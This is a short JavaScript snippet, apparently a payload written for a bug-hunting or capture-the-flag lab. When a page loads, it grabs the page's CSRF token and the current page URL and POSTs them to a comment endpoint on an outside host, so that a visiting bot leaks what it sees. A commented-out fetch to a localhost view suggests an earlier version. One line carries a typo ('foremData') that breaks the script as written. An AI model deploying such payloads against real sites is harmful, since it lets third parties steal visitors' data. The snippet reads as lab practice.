//fetch("http://127.0.0.1:9000/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
//	return res.text();
//}).then(data => {
window.onload = function () {
	var csrf = document.querySelector("[name=csrfmiddlewaretoken]").value;;
	var formData = new FormData();

	formData.append("csrfmiddlewaretoken", csrf);
	formData.append("creator", "fromBot2");
	foremData.append("body", window.location.href);

	fetch("https://unknowncontainer.br2.bughuntr.net/comment/ca5c0e56-eeaa-4bbc-a629-43de84db56c7",{
		method: 'POST',
		body: formData
	});
};

//})
